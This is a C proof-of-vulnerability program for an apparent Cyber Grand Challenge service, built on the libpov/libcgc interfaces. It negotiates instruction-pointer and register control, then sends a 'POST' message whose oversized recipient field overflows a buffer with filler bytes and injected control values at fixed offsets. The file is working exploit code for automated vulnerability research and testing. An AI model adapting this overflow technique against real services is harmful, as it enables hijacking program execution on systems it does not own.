#include <libpov.h>
#include <libcgc.h>

#define TO_CB   1
#define FROM_CB 0
#define TO_SF   3
#define FROM_SF 3


int SendToCB(char *buf, int length) {
  int total_sent = 0;
  int ret;
  size_t bytes_sent = 0;
  while(total_sent < length) {
    ret = transmit(TO_CB, buf + total_sent, length - total_sent, &bytes_sent);
    if (ret != 0) {
      // error
      return -1;
    }
    if (bytes_sent == 0) {
      break;
    }
    total_sent += bytes_sent;
  }
  return bytes_sent;
}

int ReceiveFromCB(char *buf, int length) {
  size_t total_received = 0;
  size_t bytes_received = 0;
  int ret;
  while (total_received < length) {
    ret = receive(FROM_CB, buf + total_received , length - total_received , &bytes_received);
    if (ret != 0) {
      return -1;
    }
    if (bytes_received == 0) {
      break;
    }
    total_received += bytes_received;
  }
  return total_received;
}


int main(void) {
  // negotiate
  type1_vals t1vals;
  type1_negotiate(0xEEEEEEEE, 0xEEEEEEEE, 5, &t1vals);

  // perform POV
  char input[11];
  ReceiveFromCB(input, 9);
  char bytes[1111] = "POST sender:sender!recipient:+BCcCcCcCcCcCcCcCcCcCcCcCcCcCcCcCcCcCcJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJIIIIHHHH!body:dump 1128775680!subject:subject!\nQUIT\n";
  *(int *)(bytes + 1059) = t1vals.regval | 0x11111111;
  *(int *)(bytes + 1063) = t1vals.ipval | 0x11111111;
  SendToCB(bytes, sizeof(bytes));
 
  size_t bytes_received;
  char c;
  receive(FROM_CB, &c, 1, &bytes_received);
  
  return 0;
}